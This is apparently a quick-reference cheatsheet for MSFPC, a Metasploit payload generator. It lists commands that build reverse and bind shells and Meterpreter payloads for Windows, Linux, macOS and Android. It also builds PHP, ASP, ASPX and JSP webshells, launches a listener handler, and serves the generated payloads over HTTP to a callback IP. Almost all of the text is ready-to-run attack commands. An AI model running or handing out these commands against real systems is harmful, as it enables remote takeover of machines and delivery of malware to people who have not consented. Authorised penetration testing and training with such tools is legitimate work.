# MSFPC Cheatsheet

## Quick Reference

### Installation

```bash
sudo apt update && sudo apt install msfpc
```

### Quick Commands

```bash
# Full interactive
msfpc

# Windows reverse TCP (manual IP)
msfpc windows 192.168.1.100

# Windows bind shell on port 5555
msfpc windows bind 5555 verbose

# Linux bind shell on eth0
msfpc elf bind eth0 4444

# All payloads for every type
msfpc verbose loop eth0

# All Meterpreter combinations
msfpc msf batch wan
```

### Usage Syntax

```bash
msfpc <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>) (<VERBOSE>)
```

### Target Types

| Type | Output | Platform |
|------|--------|----------|
| windows | .exe | Windows |
| linux/elf | .elf | Linux |
| osx/macho | .macho | macOS |
| android | .apk | Android |
| php | .php | PHP webshell |
| asp | .asp | ASP webshell |
| aspx | .aspx | ASPX webshell |
| jsp | .jsp | JSP webshell |
| war | .war | Java WAR |
| bash | .sh | Bash script |
| perl | .pl | Perl script |
| python | .py | Python script |
| powershell | .ps1 | PowerShell script |

### Connection Methods

| Method | Description |
|--------|-------------|
| reverse | Target connects back (default) |
| bind | Attacker connects to target |

### Transport Methods

| Method | Description |
|--------|-------------|
| tcp | Raw TCP (default) |
| http | HTTP traffic |
| https | SSL-encrypted HTTP |
| find_port | Port scan for open ports |

### Output

Each run produces:
1. Payload file (e.g., `windows-meterpreter-staged-reverse-tcp-4444.exe`)
2. Handler script (e.g., `*-exe.rc`)
3. MD5/SHA1/SHA256 hashes

### Launch Handler

```bash
msfconsole -q -r /root/windows-meterpreter-staged-reverse-tcp-4444-exe.rc
```

### Examples

```bash
# Stageless Python HTTPS
msfpc stageless cmd py https

# Windows Meterpreter with verbose
msfpc windows eth0 reverse verbose

# Linux with custom port
msfpc linux 192.168.1.100 5555

# PHP reverse shell
msfpc php 192.168.1.100 8080
```

### Quick HTTP Server

```bash
# After generating payload, serve it
python3 -m http.server 8080
```
